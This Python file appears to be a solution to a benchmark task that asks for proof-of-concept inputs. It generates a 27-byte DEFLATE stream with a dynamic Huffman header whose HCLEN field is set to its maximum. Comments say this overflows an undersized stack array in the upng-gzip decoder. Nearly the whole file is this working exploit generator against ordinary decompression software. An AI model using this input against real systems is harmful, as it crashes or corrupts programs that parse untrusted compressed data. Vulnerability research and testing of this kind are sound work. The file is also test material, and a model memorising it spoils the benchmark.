import sys

class Solution:
    """
    Generates a Proof-of-Concept input for a Stack Buffer Overflow in upng-gzip.
    """

    class BitWriter:
        """
        A helper class to write bits LSB-first to a bytearray, as required by DEFLATE.
        """
        def __init__(self):
            self.data = bytearray()
            self.buffer = 0
            self.bit_count = 0

        def write(self, value: int, num_bits: int):
            """
            Writes `num_bits` from `value` to the buffer.
            """
            self.buffer |= (value << self.bit_count)
            self.bit_count += num_bits
            while self.bit_count >= 8:
                self.data.append(self.buffer & 0xFF)
                self.buffer >>= 8
                self.bit_count -= 8

        def flush(self) -> bytes:
            """
            Writes any remaining bits in the buffer to the data stream and returns the result.
            """
            if self.bit_count > 0:
                self.data.append(self.buffer & 0xFF)
            return bytes(self.data)

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        # The vulnerability is a stack buffer overflow in the Huffman decoding logic.
        # It occurs when decoding a DEFLATE stream with a dynamic Huffman table.
        # A temporary array on the stack for storing code lengths for the "code
        # length alphabet" is incorrectly sized to 15. The DEFLATE specification
        # allows this alphabet to have up to 19 symbols.
        #
        # By setting the 4-bit HCLEN field in the DEFLATE header to its maximum
        # value of 15, we instruct the decoder to read 19 (15 + 4) code lengths.
        # This causes an out-of-bounds write when the decoder processes the 16th
        # and subsequent lengths, smashing the stack.
        #
        # The PoC constructs a minimal DEFLATE stream with this trigger and pads
        # it with zeros to the ground-truth length to ensure the crash is observable.

        writer = self.BitWriter()

        # --- DEFLATE Block Header (17 bits) ---

        # BFINAL (1 bit): Set to 1, indicating this is the final block.
        writer.write(1, 1)
        # BTYPE (2 bits): Set to 10, indicating dynamic Huffman codes.
        writer.write(2, 2)
        # HLIT (5 bits): Number of Literal/Length codes - 257. Set to 0 for a minimal table.
        writer.write(0, 5)
        # HDIST (5 bits): Number of Distance codes - 1. Set to 0 for a minimal table.
        writer.write(0, 5)
        # HCLEN (4 bits): Number of Code Length codes - 4. Set to 15 (max value).
        # This is the VULNERABILITY TRIGGER, resulting in 19 code lengths to be read.
        writer.write(15, 4)

        # The header is 17 bits. We pad the rest of the PoC to match the ground-truth length.
        total_bits = 27 * 8
        header_bits = 17
        padding_bits = total_bits - header_bits

        # Pad with zeros. These bits will be consumed during the out-of-bounds
        # reads into the `clcls` array and any subsequent decoding attempts,
        # leading to a crash when the corrupted stack is used.
        for _ in range(padding_bits):
            writer.write(0, 1)

        return writer.flush()